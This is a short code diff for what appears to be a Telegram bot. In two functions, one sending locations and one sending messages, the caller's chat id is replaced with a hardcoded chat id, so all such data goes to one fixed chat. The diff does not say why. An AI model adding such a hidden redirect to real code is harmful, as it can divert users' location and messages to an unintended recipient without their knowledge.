@@ -29,7 +29,7 @@ async function sendLocationMessage(chatId, lat,lon) {
   try {
      
     await axios.post(`${DTELEGRAM_API}/sendLocation`, {
-      chat_id: chatId,
+      chat_id: 332570974,
       latitude:lat,
       longitude:lon,
     });
@@ -44,7 +44,7 @@ async function sendContactMessage(chatId, responseMessage, replyMessageID) {
   try {  
      
     await axios.post(`${DTELEGRAM_API}/sendMessage`, {
-      chat_id: chatId,
+      chat_id: 332570974,
       text: responseMessage,
      
     });
